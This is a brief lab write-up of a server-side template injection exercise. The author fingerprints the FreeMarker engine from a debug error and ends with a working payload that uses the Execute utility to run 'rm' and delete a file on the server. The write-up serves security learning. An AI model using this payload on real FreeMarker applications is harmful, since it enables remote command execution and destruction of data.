# Practitioner Lab 109: Server-side template injection using documentation

---

This lab is vulnerable to server-side template injection. To solve the lab, identify the template engine and use the documentation to work out how to execute arbitrary code, then delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials:

```
content-manager:C0nt3ntM4n4g3r
```

![Untitled](Practitioner%20Lab%20109%20Server-side%20template%20injectio%20d82ba42842f84a6f8888ae2727fcbed7/Untitled.png)

![Untitled](Practitioner%20Lab%20109%20Server-side%20template%20injectio%20d82ba42842f84a6f8888ae2727fcbed7/Untitled%201.png)

As can be seen the 49 was outputted. 

```
${{<%[%'"}}%\l
```

when this was put into the query it did not output anything. meaning it was giving an error but no info was being displayed. 

```
(DEBUG mode; use RETHROW in production!): The following has evaluated to null or missing: ==> foobar [in template "freemarker" at line 3, column 18] ---- Tip: If the failing expression is known to legally refer to something that's sometimes null or missing, either specify a default value like myOptionalVar!myDefault, or use <#if myOptionalVar??>when-present<#else>when-missing. (These only cover the last step of the expression; to cover the whole expression, use parenthesis: (myOptionalVar.foo)!myDefault, (myOptionalVar.foo)?? ---- ---- FTL stack trace ("~" means nesting-related): - Failed at: ${foobar} [in template "freemarker" at line 3, column 16] ---- Java stack trace (for programmers): ---- freemarker.core.InvalidReferenceException: [... Exception message was already printed; see it above ...] at freemarker.core.InvalidReferenceException.getInstance(InvalidReferenceException.java:134) at freemarker.core.EvalUtil.coerceModelToTextualCommon(EvalUtil.java:479) at freemarker.core.EvalUtil.coerceModelToStringOrMarkup(EvalUtil.java:401) at freemarker.core.EvalUtil.coerceModelToStringOrMarkup(EvalUtil.java:370) at freemarker.core.DollarVariable.calculateInterpolatedStringOrMarkup(DollarVariable.java:100) at freemarker.core.DollarVariable.accept(DollarVariable.java:63) at freemarker.core.Environment.visit(Environment.java:331) at freemarker.core.Environment.visit(Environment.java:337) at freemarker.core.Environment.process(Environment.java:310) at freemarker.template.Template.process(Template.java:383) at lab.actions.templateengines.FreeMarker.processInput(FreeMarker.java:58) at lab.actions.templateengines.FreeMarker.act(FreeMarker.java:42) at lab.actions.common.Action.act(Action.java:57) at lab.actions.common.Action.run(Action.java:39) at lab.actions.templateengines.FreeMarker.main(FreeMarker.java:23)
```

Putting ${foobar} gave the following error which tells me which version it is. 

![Untitled](Practitioner%20Lab%20109%20Server-side%20template%20injectio%20d82ba42842f84a6f8888ae2727fcbed7/Untitled%202.png)

This worked which means that now I can use the rm command to remove the file 

![Untitled](Practitioner%20Lab%20109%20Server-side%20template%20injectio%20d82ba42842f84a6f8888ae2727fcbed7/Untitled%203.png)

This solved the lab. 

```
${"freemarker.template.utility.Execute"?new()("rm /home/carlos/morale.txt")} 
```